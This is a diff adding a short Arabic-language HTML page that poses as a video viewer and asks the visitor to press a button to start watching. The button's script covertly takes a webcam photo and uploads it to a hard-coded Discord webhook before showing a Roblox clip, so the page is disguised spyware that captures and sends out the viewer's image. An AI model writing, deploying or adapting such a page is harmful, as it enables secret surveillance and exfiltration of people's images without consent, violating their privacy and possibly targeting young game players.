@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>مشاهدة الفيديو</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #000;
+      color: #fff;
+      font-family: sans-serif;
+    }
+    #videoElement {
+      display: none;
+      width: 100%;
+      max-width: 640px;
+    }
+  </style>
+</head>
+<body>
+
+<h2>اضغط موافق لبدء مشاهدة الفيديو</h2>
+<button onclick="startProcess()">بدء</button>
+
+<video id="videoElement" controls>
+  <source src="file:///C:/Users/sssae/Videos/Captures/Roblox%202025-07-20%2015-15-15.mp4.mp4" type="video/mp4">
+</video>
+
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/1405241771147005982/-GcjNpZ6HTB2tuXweaZ4oF0VTBZla6lbL7y9WPYx3FKHtEbmW_xscfQjC3YVO6ro2RLK";
+
+async function startProcess() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    const blob = await imageCapture.takePhoto();
+
+    // رفع الصورة للويب هووك
+    const formData = new FormData();
+    formData.append("file", blob, "capture.jpg");
+    formData.append("content", "📸 صورة من الكاميرا قبل عرض الفيديو");
+    await fetch(webhookUrl, { method: "POST", body: formData });
+
+    track.stop(); // إيقاف الكاميرا
+
+    // عرض الفيديو
+    document.querySelector("h2").style.display = "none";
+    document.querySelector("button").style.display = "none";
+    document.getElementById("videoElement").style.display = "block";
+  } catch (err) {
+    alert("لم يتم التحقق !.");
+  }
+}
+</script>
+
+</body>
+</html>
